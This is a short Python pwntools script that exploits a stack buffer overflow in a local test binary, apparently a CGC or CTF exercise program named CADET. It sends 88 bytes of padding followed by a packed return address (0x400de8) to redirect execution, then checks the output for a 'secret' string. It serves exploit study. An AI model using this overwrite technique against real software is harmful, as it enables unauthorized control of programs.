import pwn
import binascii

with open('input','rb') as f :
   #hexdata = binascii.hexlify(f.read())
   hexdata = f.read()

print( hexdata )
print( 'Length: {}'.format( len( hexdata ) )  )

truncated = hexdata[:88]


target = 0x400de8

p = pwn.process( '../CADET_new_O0' )
print( p.readuntil(b': ') )

# pwn.gdb.attach( p )
# pwn.pause()

p.sendline( truncated + pwn.p64( target ) )
secret = p.read()
s = str( secret )
if ( s.find( 'secret' ) == -1  ) :
    print( 'No secret here!' )
else :
    print( secret )

